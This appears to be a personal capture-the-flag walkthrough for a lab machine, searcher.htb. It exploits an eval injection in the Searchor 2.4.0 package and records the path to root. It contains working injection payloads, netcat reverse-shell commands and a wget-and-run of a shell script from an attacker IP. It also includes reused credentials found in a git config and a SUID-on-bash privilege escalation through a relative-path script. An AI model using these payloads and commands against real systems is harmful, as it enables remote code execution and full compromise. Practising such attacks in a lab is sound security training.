http://searcher.htb/ runs off of Flask and uses an open source github project

https://github.com/ArjunSharda/Searchor/releases/tag/v2.4.0

https://security.snyk.io/package/pip/searchor/2.4.0 -> eval function give users code execution

__import__("os").getcwd() --> outputs current directory when printed

engine=Google&query=apple', print(__import__("os").getcwd()))#
=====================================

__import__('os').system('nc 10.10.10.10 1234 -e /bin/sh') --> rev shell code
__import__('os').system('nc 10.10.14.48 4444 -e /bin/sh')

Rev code didnt work, but we did find out the home directory of a user we're execing code from:
engine=Google&query=apple', print(__import__("os").path.expanduser('~')))#

/home/svc

print(__import__("subprocess").getoutput("cat /home/svc/user.txt")) -> allows for shell like command exec

user : 0d1f2bf3482955f7862e717e471990ac

wget http://10.10.14.48:80/shell.sh -O /tmp/shell.sh -> chmod +x before wgetting
/bin/bash /tmp/shell.sh -> gives us a shell on the box

./ like commands arent valid on this box, u have to use /bin/bash to execute bash scripts
=============================================================================
The box has something called SNAP installed, this can be found in the /home/svc
GTFO-Bins says if snap can be ran as sudo it can be abused

cmd: snap version
snap    2.58.2
snapd   2.58.2
series  16
ubuntu  22.04
kernel  5.15.0-69-generic

Inside of /home/svc there was a .gitconfig
with that we can then simple search directories [ls -a] and try finding anything with a .git directory

/var/ww/app has a .git, inside /var/www/app/.git/config was a user and pass
cody:jh1usoih2bkjaspwe92
svc:jh1usoih2bkjaspwe92 -> SSH Login (WORKS!)

sudo -l shows a command that can be ran

sudo command : sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
After using the sudo command in both the /opt/scripts dir and say our home dir
the script doesnt run correctly when we run the sudo command at the home dir
this means that the full-checkup runs based on relative dir (meaning you have to be in the same dir as the full-checkup.sh in /opt/scripts to run), with this knowledge we can make our own full-checkup.sh script that chmod u+s /bin/bash
Allowing us to now esc to root and cat the flag
